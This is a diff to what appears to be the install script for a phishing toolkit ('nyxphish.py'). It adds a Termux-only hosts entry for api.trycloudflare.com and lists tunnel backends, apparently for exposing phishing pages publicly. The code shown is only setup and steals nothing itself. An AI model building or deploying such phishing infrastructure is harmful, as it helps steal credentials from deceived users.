@@ -47,6 +47,16 @@ if ! command -v lt >/dev/null 2>&1; then
     fi
 fi
 
+# termux DNS fix for cloudflared (issue #1684): hardcode api ip into hosts
+if [ -d "/data/data/com.termux" ]; then
+    HOSTS="$PREFIX/etc/hosts"
+    mkdir -p "$PREFIX/etc"
+    if ! grep -q "api.trycloudflare.com" "$HOSTS" 2>/dev/null; then
+        echo "104.16.230.132 api.trycloudflare.com" >> "$HOSTS"
+        echo -e "${G}[+] hosts entry added for trycloudflare api (dns workaround)${N}"
+    fi
+fi
+
 echo -e "${G}[+] tunnel backends: cloudflared (primary), localhost.run (ssh), localtunnel (backup)${N}"
 
 chmod +x nyxphish.py
